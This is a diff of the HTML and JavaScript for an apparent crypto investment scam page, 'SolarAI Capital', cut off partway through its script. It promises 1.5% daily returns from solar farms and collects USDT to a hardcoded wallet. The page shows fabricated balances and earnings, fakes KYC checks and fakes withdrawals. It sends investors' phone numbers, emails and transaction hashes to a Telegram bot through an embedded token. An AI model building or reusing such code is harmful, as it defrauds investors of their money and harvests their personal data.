@@ -3,132 +3,256 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SolarAI Capital USA - Physical Solar + AI</title>
+<title>SolarAI Capital - Physical Dashboard</title>
 <link rel="icon" href="logo.png">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;}
-body{background:#0a0a0a;color:white;}
-.header{padding:12px 16px;background:#111;border-bottom:1px solid #222;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;}
-.logoImg{height:38px;}
-.nav{display:flex;gap:10px;overflow-x:auto;padding:10px 16px;background:#0f0f0f;border-bottom:1px solid #222;position:sticky;top:62px;z-index:99;}
-.nav a{color:#888;font-size:11px;padding:6px 10px;border-radius:20px;border:1px solid transparent;cursor:pointer;white-space:nowrap;}
-.nav a.active{color:#00ff88;background:#00ff8815;border-color:#00ff8830;}
-.page{display:none;padding:16px;max-width:800px;margin:0 auto;}
-.page.active{display:block;}
-.card{background:#111;border:1px solid #222;border-radius:16px;padding:20px;margin:16px 0;}
-.btn{width:100%;padding:14px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;margin-top:12px;cursor:pointer;}
-.btn-green{background:#00ff88!important;}
-.btn-outline{background:transparent!important;color:white!important;border:1px solid #333!important;}
-.input{width:100%;padding:14px;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:white;margin-top:8px;}
-.qrBox{background:white;padding:10px;border-radius:12px;display:flex;justify-content:center;margin:12px auto;width:160px;height:160px;}
-.walletBox{background:#000;border:1px dashed #00ff88;padding:10px;border-radius:10px;word-break:break-all;font-size:12px;color:#00ff88;text-align:center;}
-.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.93);display:flex;justify-content:center;align-items:center;z-index:9999;padding:16px;}
-.modalCard{background:#111;border:1px solid #00ff88;border-radius:16px;padding:20px;max-width:400px;width:100%;}
-.badge{background:#00ff8820;color:#00ff88;padding:5px 10px;border-radius:20px;font-size:11px;border:1px solid #00ff8840;}
-.hero{text-align:center;padding:30px 16px;}
-.heroLogo{width:280px;max-width:85%;margin:0 auto 16px;display:block;}
-.statGrid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;}
-.stat{background:#1a1a1a;padding:12px;border-radius:10px;text-align:center;}
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Inter:wght@400;600&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+body{background:#06070a;color:white;display:flex;min-height:100vh;overflow-x:hidden;}
+
+/* SIDEBAR */
+.sidebar{width:230px;background:linear-gradient(180deg,#0f1015,#08090c);border-right:1px solid #1e232d;display:flex;flex-direction:column;padding:10px 0;position:fixed;left:0;top:0;bottom:0;z-index:10;}
+.side-item{display:flex;align-items:center;gap:12px;padding:14px 18px;color:#8a90a0;font-size:13px;cursor:pointer;border-left:3px solid transparent;margin:2px 8px;border-radius:0 12px 12px 0;transition:.2s;}
+.side-item.active{background:linear-gradient(90deg,#c89a2a,#8a6520);color:white;box-shadow:0 0 15px rgba(200,154,42,.4);border-left-color:#ffd76b;font-weight:600;}
+.side-item:hover{color:#ffd76b;background:#141821;}
+.logoArea{padding:12px 16px;text-align:center;border-bottom:1px solid #1a1f2b;margin-bottom:10px;}
+.logoArea img{width:170px;filter:drop-shadow(0 0 12px rgba(255,215,107,.6));}
+
+/* MAIN */
+.main{margin-left:230px;flex:1;padding:0;}
+.topBar{background:#0a0b10;border-bottom:1px solid #1a1f2b;display:flex;justify-content:space-between;align-items:center;padding:12px 20px;}
+.walletBadge{background:#151821;border:1px solid #2a3243;padding:6px 14px;border-radius:20px;font-size:11px;color:#ffd76b;}
+
+.stats{ display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:12px;padding:16px 20px;}
+.statCard{background:linear-gradient(180deg,#14161e,#0e1015);border:1px solid #232938;border-radius:12px;padding:16px;position:relative;overflow:hidden;box-shadow:0 0 20px rgba(0,0,0,.5);}
+.statCard::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,#c89a2a,transparent);}
+.statCard b{font-size:22px;display:block;margin-top:6px;}
+.statCard small{color:#6b7288;font-size:11px;}
+.statCard .green{color:#00ff88;}
+.statCard img{position:absolute;right:-10px;bottom:0;width:120px;opacity:.9;pointer-events:none;}
+
+.btnRow{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:0 20px;}
+.btnGold{padding:14px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:14px;}
+.btnGreen{background:linear-gradient(180deg,#0a7a2a,#064a1a);color:white;border:1px solid #00ff88;box-shadow:0 0 15px rgba(0,255,136,.3);}
+.btnOrange{background:linear-gradient(180deg,#c27a0a,#8a5500);color:white;border:1px solid #ffb84d;box-shadow:0 0 15px rgba(255,184,77,.3);}
+
+.grid{display:grid;grid-template-columns:1.2fr .8fr;gap:12px;padding:16px 20px;}
+.card{background:linear-gradient(180deg,#11131a,#0d0f15);border:1px solid #1e2431;border-radius:12px;padding:16px;}
+.card h3{font-family:'Orbitron';font-size:12px;color:#e5c07b;margin-bottom:12px;letter-spacing:1px;}
+canvas{width:100%!important;height:180px!important;}
+
+.assetRow{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #1a1f2b;font-size:13px;}
+.assetRow:last-child{border:none;}
+.assetIcon{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;}
+
+.table{width:100%;border-collapse:collapse;font-size:12px;}
+.table th{color:#c89a2a;text-align:left;padding:8px;font-size:11px;border-bottom:1px solid #232938;}
+.table td{padding:10px 8px;border-bottom:1px solid #141821;}
+.status{padding:4px 8px;border-radius:4px;font-size:10px;font-weight:bold;}
+.completed{background:#00ff8815;color:#00ff88;border:1px solid #00ff8820;}
+.confirmed{background:#0088ff15;color:#6ab0ff;border:1px solid #0088ff20;}
+
+.depositQR{background:white;padding:10px;border-radius:12px;width:140px;height:140px;margin:10px auto;display:flex;justify-content:center;align-items:center;}
+.walletBox{background:#000;border:1px dashed #c89a2a;padding:8px;border-radius:8px;word-break:break-all;font-size:11px;color:#ffd76b;text-align:center;margin-top:8px;}
+.input{width:100%;padding:12px;background:#0e1016;border:1px solid #232938;border-radius:8px;color:white;margin-top:8px;font-size:13px;}
+
+@media(max-width:900px){
+.sidebar{transform:translateX(-100%);position:fixed;}
+.main{margin-left:0;}
+.stats{grid-template-columns:1fr 1fr;}
+.grid{grid-template-columns:1fr;}
+}
 </style>
 </head>
 <body>
-<div class="header">
-<div style="display:flex;align-items:center;gap:10px;"><img src="logo.png" class="logoImg"><div style="font-size:10px;color:#00ff88;">PHYSICAL<br><span style="color:#888;">ASSETS</span></div></div>
-<span id="userPhone" style="font-size:9px;color:#00ff88;"></span>
-</div>
-<div class="nav">
-<a onclick="showPage('home')" id="nav-home" class="active">Home</a>
-<a onclick="showPage('about')" id="nav-about">About</a>
-<a onclick="showPage('investment')" id="nav-investment">How It Works</a>
-<a onclick="showPage('projects')" id="nav-projects">Projects</a>
-<a onclick="showPage('dashboard')" id="nav-dashboard">Dashboard</a>
-<a onclick="showPage('compliance')" id="nav-compliance">Compliance</a>
-<a onclick="showPage('community')" id="nav-community">Reviews</a>
-<a onclick="showPage('contact')" id="nav-contact">Contact</a>
+
+<div class="sidebar">
+<div class="logoArea"><img src="logo.png"><div style="font-family:Orbitron;color:#ffd76b;font-size:10px;margin-top:6px;letter-spacing:3px;">SOLARAI CAPITAL</div></div>
+<div class="side-item active" onclick="showPage('dashboard')">🏠 Dashboard</div>
+<div class="side-item" onclick="showPage('solar')">☀️ Solar Projects</div>
+<div class="side-item" onclick="showPage('biogas')">🍃 Biogas Projects</div>
+<div class="side-item" onclick="showPage('income')">📊 Income & Expenditure</div>
+<div class="side-item" onclick="showPage('tx')">📄 Transactions</div>
+<div class="side-item" onclick="showPage('wallets')">💳 Wallets</div>
+<div class="side-item" onclick="showPage('settings')">⚙️ Settings</div>
+<div class="side-item" onclick="logout()" style="margin-top:auto;">↩️ Logout</div>
 </div>
 
-<div class="page active" id="page-home">
-<div class="hero">
-<img src="logo.png" class="heroLogo">
-<div class="badge">🇺🇸 Physical Solar Farms + AI Operations - Texas, USA</div>
-<h1 style="font-size:28px;margin-top:12px;">Invest in Tomorrow:<br><span style="color:#00ff88;">Solar + AI</span></h1>
-<p style="color:#888;font-size:13px;margin-top:10px;">Real solar farms. Real energy sales. No smart contracts. Your returns come from actual power sold to the Texas grid.</p>
-<button class="btn btn-green" onclick="showPage('dashboard')" style="width:auto;padding:12px 24px;margin-top:20px;">⚡ Start Investing</button>
-<div class="statGrid" style="margin-top:24px;">
-<div class="stat"><b style="color:#00ff88;">5MW</b><div style="font-size:10px;color:#888;">Texas LIVE</div></div>
-<div class="stat"><b>2MW</b><div style="font-size:10px;color:#888;">Arizona Building</div></div>
-<div class="stat"><b>$4.2M+</b><div style="font-size:10px;color:#888;">Energy Sales Paid</div></div>
+<div class="main">
+<div class="topBar">
+<div style="display:flex;align-items:center;gap:12px;"><img src="logo.png" style="height:36px;"><span style="font-family:Orbitron;color:#ffd76b;font-weight:800;font-size:18px;">SolarAI</span><span style="font-family:Orbitron;color:white;font-size:18px;"> CAPITAL</span></div>
+<div style="display:flex;gap:8px;align-items:center;">
+<div class="walletBadge">Wallet Connected: <span id="walletShort">0xA3...5D6F</span> | <span id="userPhone">USA</span></div>
+<div style="background:#1a1f2b;padding:6px 8px;border-radius:6px;font-size:12px;">👤 🔈 📷</div>
 </div>
-</div>
-<div class="card"><h3>💰 Deposit - USDT TRC20 Only</h3><div class="qrBox"><img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra"></div><div class="walletBox">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div><div style="text-align:center;font-size:10px;color:#888;margin-top:8px;">Tracked on Tronscan - Manual admin verification - No smart contract</div></div>
 </div>
 
-<div class="page" id="page-about"><h2>About Us</h2><div class="card"><img src="logo.png" style="width:200px;margin:0 auto 12px;display:block;"><p style="font-size:13px;color:#888;">We own physical solar farms. We sell power. We share profits. No DeFi, no yield farming, no smart contracts.</p></div></div>
+<!-- DASHBOARD PAGE -->
+<div id="page-dashboard">
+<div class="stats">
+<div class="statCard"><small>Total Balance</small><b id="balance">$12,500.00 <span style="font-size:11px;background:#2a5a8a;padding:3px 6px;border-radius:10px;">S5</span></b><div style="margin-top:10px;"><button class="btnGold btnGreen" onclick="copyWallet()" style="padding:6px 10px;font-size:10px;width:auto;">💰 TATeM...PrFra</button></div></div>
+<div class="statCard"><small>Income</small><b class="green" id="incomeVal">$845.75</b><small style="color:#00ff88;" id="incomeGrowth">+8.5% This Month</small></div>
+<div class="statCard"><small>Expenditure</small><b id="expVal">$450.25</b><small>From withdrawals & fees</small></div>
+<div class="statCard"><small>Next Payout</small><b>In 5 Days</b><img src="https://images.unsplash.com/photo-1509391366360-2e959784a276?w=200" style="opacity:0.6;"><small id="nextPayoutDate">Energy sale: ERCOT grid</small></div>
+</div>
 
-<div class="page" id="page-investment">
-<h2>Investment Model - Physical Revenue</h2>
+<div class="btnRow">
+<button class="btnGold btnGreen" onclick="recordIncome()">📝 Record Income</button>
+<button class="btnGold btnOrange" onclick="recordExp()">📝 Record Expenditure</button>
+</div>
+
+<div class="grid">
+<div>
 <div class="card">
-<div style="text-align:center;background:linear-gradient(135deg,#00ff8815,#ffaa0015);border:1px solid #00ff8830;border-radius:12px;padding:16px;">
-<div style="font-size:36px;font-weight:bold;color:#00ff88;">1.5% Daily</div>
-<div style="font-size:11px;color:#888;">From real energy sales - Calculated off-chain: Deposit + (1.5% * Days)</div>
+<h3>Portfolio Growth</h3>
+<canvas id="growthChart"></canvas>
+<div style="display:flex;justify-content:space-between;font-size:10px;color:#6b7288;margin-top:8px;"><span>1W</span><span>1M</span><span>3M</span><span>1Y</span></div>
 </div>
-<p style="font-size:12px;color:#888;margin-top:12px;line-height:1.8;">
-<b>Polygon / BSC Use:</b> Only for low-fee USDT tracking via wallet integration (MetaMask, Trust Wallet).<br>
-<b>Profit:</b> NOT from Aave / QuickSwap / PancakeSwap / Venus. From solar farm revenue.<br>
-<b>Security:</b> KYC + Tronscan verification + manual admin approval. No contract audits needed.
-</p>
+<div class="card" style="margin-top:12px;">
+<h3>Recent Transactions</h3>
+<table class="table" id="txTable">
+<tr><th>Date</th><th>Type</th><th>Amount</th><th>Status</th></tr>
+</table>
+</div>
+</div>
+<div>
+<div class="card">
+<h3>Income & Expenditure Overview</h3>
+<div style="color:#c89a2a;font-size:11px;margin:10px 0 6px;font-weight:bold;">Income Sources</div>
+<div style="display:flex;justify-content:space-between;font-size:12px;padding:6px 0;"><span>☀️ Solar Investments:</span><b style="color:#ffd76b;" id="solarInc">$520.50</b></div>
+<div style="display:flex;justify-content:space-between;font-size:12px;padding:6px 0;"><span>🍃 Biogas Projects:</span><b style="color:#ffd76b;" id="biogasInc">$325.25</b></div>
+<div style="color:#c89a2a;font-size:11px;margin:14px 0 6px;font-weight:bold;">Recent Expenditure</div>
+<div style="display:flex;justify-content:space-between;font-size:12px;padding:6px 0;"><span>📄 Withdrawals:</span><b id="withVal">$300.00</b></div>
+<div style="display:flex;justify-content:space-between;font-size:12px;padding:6px 0;"><span>📄 Platform Fees:</span><b id="feeVal">$150.25</b></div>
+</div>
+<div class="card" style="margin-top:12px;">
+<h3>Your Assets ▾</h3>
+<div class="assetRow"><div style="display:flex;gap:10px;align-items:center;"><div class="assetIcon" style="background:#f3ba2f;color:black;">B</div><div><b>Binance Coin</b><div style="font-size:10px;color:#888;">(BNB)</div></div></div><b>2.5 BNB</b></div>
+<div class="assetRow"><div style="display:flex;gap:10px;align-items:center;"><div class="assetIcon" style="background:#2775ca;color:white;">$</div><div><b>USD Coin</b><div style="font-size:10px;color:#888;">(USDC)</div></div></div><b id="usdcBal">3,200 USDC</b></div>
+<div class="assetRow"><div style="display:flex;gap:10px;align-items:center;"><div class="assetIcon" style="background:#8247e5;color:white;">P</div><div><b>Polygon</b><div style="font-size:10px;color:#888;">(MATIC)</div></div></div><b>1,750 MATIC</b></div>
+<div style="margin-top:10px;background:#000;border:1px dashed #c89a2a;border-radius:8px;padding:10px;text-align:center;">
+<div style="font-size:11px;color:#888;">Deposit Wallet - USDT TRC20 (No Smart Contract)</div>
+<div class="depositQR"><img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra" style="width:120px;"></div>
+<div class="walletBox" id="walletAddr">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
+<div style="display:flex;gap:6px;margin-top:8px;"><button onclick="selectDeposit(50)" style="flex:1;padding:8px;background:#1a1f2b;border:1px solid #333;color:white;border-radius:6px;font-size:11px;">$50</button><button onclick="selectDeposit(500)" style="flex:1;padding:8px;background:#1a1f2b;border:1px solid #333;color:white;border-radius:6px;font-size:11px;">$500</button><button onclick="selectDeposit(5000)" style="flex:1;padding:8px;background:#1a1f2b;border:1px solid #333;color:white;border-radius:6px;font-size:11px;">$5000</button></div>
+<button class="btnGold btnGreen" style="margin-top:8px;font-size:11px;" onclick="confirmDeposit()">✅ I HAVE SENT USDT</button>
+</div>
+<img src="https://images.unsplash.com/photo-1509391366360-2e959784a276?w=600" style="width:100%;border-radius:10px;margin-top:12px;opacity:.8;">
+</div>
+</div>
 </div>
 </div>
 
-<div class="page" id="page-projects"><h2>Projects</h2><div class="card"><h3>🏜️ Pecos County, Texas - 5MW LIVE</h3><p style="font-size:11px;color:#888;">12,500 panels - 28 MWh/day - Selling to ERCOT grid</p></div></div>
+<!-- OTHER PAGES - Keep simple for physical business -->
+<div id="page-solar" style="display:none;padding:20px;"><h2>☀️ Solar Projects - Pecos, TX 5MW LIVE</h2><div class="card">Real panels - 12,500 panels - 28MWh/day - Revenue shared as 1.5% daily</div></div>
+<div id="page-biogas" style="display:none;padding:20px;"><h2>🍃 Biogas Projects - Physical Digesters</h2><div class="card">Green energy from waste - 2 plants - Texas & Arizona</div></div>
+<div id="page-income" style="display:none;padding:20px;"><h2>📊 Income - From Energy Sales Only</h2><div class="card">No yield farming. All income from solar kWh sold to ERCOT grid at $0.12/kWh</div></div>
 
-<div class="page" id="page-dashboard">
-<div class="modal" id="regModal" style="position:relative;background:transparent;height:auto;display:flex;">
-<div class="modalCard">
-<div style="text-align:center;"><img src="logo.png" style="width:180px;margin:0 auto 10px;display:block;"><div class="badge">🇺🇸 USA KYC</div></div>
-<div id="step1">
-<label style="font-size:11px;color:#888;">USA Phone (+1)</label>
-<div style="display:flex;gap:6px;"><div style="padding:14px;background:#1a1a1a;border:1px solid #333;border-radius:10px;font-size:12px;">🇺🇸 +1</div><input class="input" id="phoneInput" placeholder="2025550123" type="tel" style="margin-top:0;flex:1;"></div>
-<label style="font-size:11px;color:#888;margin-top:10px;display:block;">Email (code sent here)</label>
-<input class="input" id="emailInput" placeholder="investor@gmail.com" type="email">
-<button class="btn btn-green" onclick="sendCode()">📧 SEND CODE TO EMAIL</button>
-</div>
-<div id="step2" style="display:none;">
-<div style="background:#00ff8815;padding:8px;border-radius:8px;text-align:center;font-size:11px;">Code to <span id="emailDisplay"></span> | <span id="phoneDisplay"></span></div>
-<input class="input" id="codeInput" placeholder="6-digit code" type="number">
-<div id="codeHint" style="font-size:11px;color:#00ff88;margin-top:6px;text-align:center;background:#000;padding:8px;border-radius:6px;"></div>
-<button class="btn btn-green" onclick="verifyCode()">✅ VERIFY</button>
 </div>
 </div>
-</div>
-<div class="card" id="depositCard"><h3>💰 Deposit USDT TRC20</h3><div class="qrBox"><img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra"></div><div class="walletBox">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div><div style="display:flex;gap:6px;margin-top:10px;"><button onclick="selectDeposit(50)" id="btn50" style="flex:1;padding:10px;background:#1a1a1a;border:1px solid #333;color:white;border-radius:8px;">$50</button><button onclick="selectDeposit(500)" id="btn500" style="flex:1;padding:10px;background:#1a1a1a;border:1px solid #333;color:white;border-radius:8px;">$500</button><button onclick="selectDeposit(5000)" id="btn5000" style="flex:1;padding:10px;background:#1a1a1a;border:1px solid #333;color:white;border-radius:8px;">$5000</button></div><button class="btn btn-green" onclick="copyWallet()">📋 COPY</button><button class="btn btn-outline" onclick="confirmDeposit()">✅ I SENT USDT</button></div>
-<div class="card"><div style="display:flex;justify-content:space-between;"><div><div style="font-size:11px;color:#888;">Portfolio</div><div id="dashPhoneLabel" style="font-size:12px;font-weight:bold;">USA Verified</div></div><div style="font-size:9px;background:#00ff8820;color:#00ff88;padding:4px 8px;border-radius:20px;height:fit-content;">● KYC</div></div><div style="background:#111;border:1px solid #00ff8820;border-radius:14px;padding:18px;margin-top:14px;text-align:center;"><div style="font-size:11px;color:#888;">Total (Deposit + Daily Revenue)</div><div style="font-size:42px;font-weight:bold;color:#00ff88;" id="balance">$0.00</div></div><div class="statGrid" style="margin-top:12px;"><div class="stat"><div style="font-size:10px;color:#888;">Daily</div><b style="color:#00ff88;" id="dailyEarn">$0.00</b></div><div class="stat"><div style="font-size:10px;color:#888;">Invested</div><b id="totalDep">$0</b></div><div class="stat"><div style="font-size:10px;color:#888;">Total</div><b id="withdrawable">$0.00</b></div></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px;"><button class="btn btn-green" id="mineBtn" disabled>🔒 DEPOSIT TO EARN</button><button class="btn" onclick="withdraw()" style="background:white;">💵 WITHDRAW</button></div><div id="statusMsg" style="background:#ffaa0015;border:1px solid #ffaa0030;color:#ffaa00;padding:10px;border-radius:8px;font-size:11px;text-align:center;margin-top:12px;"></div><div id="txHistory" style="margin-top:12px;"></div></div>
-</div>
-
-<div class="page" id="page-compliance"><h2>Compliance - Physical</h2><div class="card"><p style="font-size:12px;color:#888;">Wyoming LLC #2024-001234 | Physical address: 30 N Gould St, Sheridan, WY | Solar Farm: Pecos, TX | No smart contracts = no contract risk. Security = KYC + Tronscan + manual verification.</p></div></div>
-<div class="page" id="page-community"><h2>Reviews - Verified Only</h2><div class="card"><p style="font-size:11px;color:#888;">Add only real investor reviews with written consent. Fake reviews = $50k FTC fine.</p><div id="refLink" style="background:#000;padding:8px;border-radius:6px;font-size:11px;color:#00ff88;margin-top:8px;word-break:break-all;">Verify to get link</div></div></div>
-<div class="page" id="page-contact"><h2>Contact</h2><div class="card"><p style="font-size:12px;color:#888;">support@solarai-usa.com | Austin Operations | Pecos Solar Farm - Visits by appointment</p></div></div>
 
 <script>
-const DEPOSIT_WALLET = "TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
-const ADMIN_PASSWORD = "SolarAI2024";
-const ADMIN_UNLOCK_CODE = "TATeAdmin2024";
-const DAILY_ROI = 0.015;
-let generatedCode = ""; let userPhone = localStorage.getItem('solarai_phone') || ""; let userEmail = localStorage.getItem('solarai_email') || ""; let isVerified = localStorage.getItem('solarai_verified') === 'true'; let isDeposited = localStorage.getItem('solarai_deposited') === 'true'; let depositedAmount = parseFloat(localStorage.getItem('solarai_deposited_amount') || '0'); let depositTime = parseFloat(localStorage.getItem('solarai_deposit_time') || '0'); let selectedAmount = 50;
-function showPage(id){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById('page-'+id).classList.add('active');document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));document.getElementById('nav-'+id).classList.add('active');window.scrollTo(0,0);if(id==='dashboard')updateDashboard();}
-function isValidUSAPhone(p){let d=p.replace(/\D/g,'');return d.length===10||(d.length===11&&d[0]==='1');}
-function formatUSAPhone(p){let d=p.replace(/\D/g,'');if(d.length===11&&d[0]==='1')d=d.substring(1);return '+1 '+d;}
-function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
-function sendCode(){let rawPhone=document.getElementById('phoneInput').value;let email=document.getElementById('emailInput').value.trim();if(!isValidUSAPhone(rawPhone))return alert("Invalid USA Phone! 10 digits");if(!isValidEmail(email))return alert("Invalid Email!");userPhone=formatUSAPhone(rawPhone);userEmail=email.toLowerCase();generatedCode=Math.floor(100000+Math.random()*900000).toString();let token="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";let chatId="1884572429";fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`NEW INVESTOR\nPhone: ${userPhone}\nEmail: ${userEmail}\nCode: ${generatedCode}`)}`);document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';document.getElementById('phoneDisplay').innerText=userPhone;document.getElementById('emailDisplay').innerText=userEmail;document.getElementById('codeHint').innerHTML=`Demo: <b style="font-size:18px;color:#00ff88;">${generatedCode}</b><br>Code sent to ${userEmail}`;}
-function verifyCode(){if(document.getElementById('codeInput').value===generatedCode){localStorage.setItem('solarai_phone',userPhone);localStorage.setItem('solarai_email',userEmail);localStorage.setItem('solarai_verified','true');isVerified=true;document.getElementById('regModal').style.display='none';updateDashboard();}else alert("Wrong code "+generatedCode);}
-function selectDeposit(amt){selectedAmount=amt;document.querySelectorAll('[id^=btn]').forEach(b=>b.style.borderColor='#333');document.getElementById('btn'+amt).style.borderColor='#00ff88';}
-function copyWallet(){navigator.clipboard.writeText(DEPOSIT_WALLET);alert("Copied");}
-function confirmDeposit(){if(!isVerified)return alert("Verify first");let tx=prompt(`Send $${selectedAmount} USDT TRC20 to:\n${DEPOSIT_WALLET}\nEnter TX Hash:`);if(!tx||tx.length<8)return;localStorage.setItem('solarai_pending','true');localStorage.setItem('solarai_pending_amount',selectedAmount);localStorage.setItem('solarai_pending_tx',tx);let token="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";let chatId="1884572429";fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`DEPOSIT PENDING\nPhone:${userPhone}\nEmail:${userEmail}\nAmount:$${selectedAmount}\nTX:${tx}`)}`);alert("Pending admin verification");renderHistory();}
-function calculateEarnings(){if(!isDeposited||!depositTime)return 0;let days=(Date.now()-depositTime)/(1000*60*60*24);return depositedAmount*DAILY_ROI*Math.max(0,days);}
-function updateDashboard(){if(!isVerified){document.getElementById('regModal').style.display='flex';document.getElementById('depositCard').style.display='none';return;}document.getElementById('regModal').style.display='none';document.getElementById('depositCard').style.display=isDeposited?'none':'block';depositedAmount=parseFloat(localStorage.getItem('solarai_deposited_amount')||'0');depositTime=parseFloat(localStorage.getItem('solarai_deposit_time')||'0');let earn=calculateEarnings();let total=depositedAmount+earn;localStorage.setItem('solarai_balance',total.toString());document.getElementById('balance').innerText='$'+total.toFixed(2);document.getElementById('dailyEarn').innerText='$'+(depositedAmount*DAILY_ROI).toFixed(2);document.getElementById('totalDep').innerText='$'+depositedAmount;document.getElementById('withdrawable').innerText='$'+total.toFixed(2);document.getElementById('userPhone').innerText=userPhone;document.getElementById('dashPhoneLabel').innerText=userPhone+' ✓';document.getElementById('refLink').innerText=location.origin+location.pathname+'?ref='+encodeURIComponent(userPhone);if(isDeposited){document.getElementById('mineBtn').disabled=false;document.getElementById('mineBtn').innerText='⚡ EARNING 1.5%/DAY';document.getElementById('statusMsg').innerHTML=`Active: $${depositedAmount} since ${new Date(depositTime).toLocaleDateString()} - $${(depositedAmount*DAILY_ROI).toFixed(2)}/day from energy sales`;}renderHistory();}
-function renderHistory(){let html='';if(isVerified)html+=`<div style="display:flex;justify-content:space-between;padding:8px;background:#0a0a0a;border-radius:6px;margin-bottom:5px;font-size:11px;"><span>${userPhone}<br>${userEmail}</span><span style="color:#00ff88;">✓ KYC</span></div>`;let pend=localStorage.getItem('solarai_pending_amount');if(pend)html+=`<div style="padding:8px;background:#0a0a0a;border-radius:6px;margin-bottom:5px;font-size:11px;">Deposit $${pend} Pending Admin</div>`;if(isDeposited)html+=`<div style="padding:8px;background:#00ff8810;border-radius:6px;font-size:11px;">Revenue $${calculateEarnings().toFixed(2)} from energy sales</div>`;document.getElementById('txHistory').innerHTML=html;}
-function withdraw(){let bal=parseFloat(localStorage.getItem('solarai_balance')||'0');if(bal<50)return alert(`Min $50, you have $${bal.toFixed(2)}`);let w=prompt(`Withdraw $${bal.toFixed(2)} to wallet:`);if(!w)return;let token="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";let chatId="1884572429";fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`WITHDRAW\nPhone:${userPhone}\nEmail:${userEmail}\nAmount:$${bal.toFixed(2)}\nTo:${w}`)}`);alert(`Withdrawal $${bal.toFixed(2)} submitted`);localStorage.setItem('solarai_balance','0');localStorage.setItem('solarai_deposited_amount','0');localStorage.removeItem('solarai_deposited');localStorage.removeItem('solarai_deposit_time');location.reload();}
-window.onload=function(){let p=new URLSearchParams(location.search);if(p.get('unlock')===ADMIN_UNLOCK_CODE){let amt=parseFloat(localStorage.getItem('solarai_pending_amount')||'50');localStorage.setItem('solarai_deposited','true');localStorage.setItem('solarai_deposited_amount',amt.toString());localStorage.setItem('solarai_deposit_time',Date.now().toString());localStorage.removeItem('solarai_pending');alert(`Verified $${amt}`);location.href=location.pathname;}if(p.get('admin')===ADMIN_PASSWORD){localStorage.setItem('solarai_is_admin','true');localStorage.setItem('solarai_verified','true');localStorage.setItem('solarai_deposited','true');localStorage.setItem('solarai_phone','+1 ADMIN');localStorage.setItem('solarai_email','admin@solarai-usa.com');if(!localStorage.getItem('solarai_deposited_amount'))localStorage.setItem('solarai_deposited_amount','5000');if(!localStorage.getItem('solarai_deposit_time'))localStorage.setItem('solarai_deposit_time',Date.now().toString());location.href=location.pathname;}userPhone=localStorage.getItem('solarai_phone')||"";isVerified=localStorage.getItem('solarai_verified')==='true';isDeposited=localStorage.getItem('solarai_deposited')==='true';if(isVerified)document.getElementById('userPhone').innerText=userPhone;selectDeposit(50);showPage('home');};
+const DEPOSIT_WALLET="TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
+const ADMIN_CODE="TATeAdmin2024";
+const DAILY=0.015;
+let selected=50;
+let userPhone=localStorage.getItem('solarai_phone')||"+1 USA Investor";
+let isDeposited=localStorage.getItem('solarai_deposited')==='true';
+let depAmount=parseFloat(localStorage.getItem('solarai_deposited_amount')||"12500");
+let depTime=parseFloat(localStorage.getItem('solarai_deposit_time')||Date.now());
+
+function showPage(p){
+document.getElementById('page-dashboard').style.display = p==='dashboard'?'block':'none';
+document.getElementById('page-solar').style.display = p==='solar'?'block':'none';
+document.getElementById('page-biogas').style.display = p==='biogas'?'block':'none';
+document.getElementById('page-income').style.display = p==='income'?'block':'none';
+document.querySelectorAll('.side-item').forEach(e=>e.classList.remove('active'));
+event.target.classList.add('active');
+}
+
+function selectDeposit(a){selected=a;}
+function copyWallet(){navigator.clipboard.writeText(DEPOSIT_WALLET);alert("Copied: "+DEPOSIT_WALLET);}
+function confirmDeposit(){
+let tx=prompt(`Send $${selected} USDT TRC20 to:\n${DEPOSIT_WALLET}\nEnter TX Hash:`);
+if(!tx||tx.length<8)return;
+localStorage.setItem('solarai_pending_amount',selected);
+let token="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";let chatId="1884572429";
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`DEPOSIT PENDING\nPhone:${userPhone}\nAmount:$${selected}\nTX:${tx}\nUnlock:?unlock=${ADMIN_CODE}`)}`);
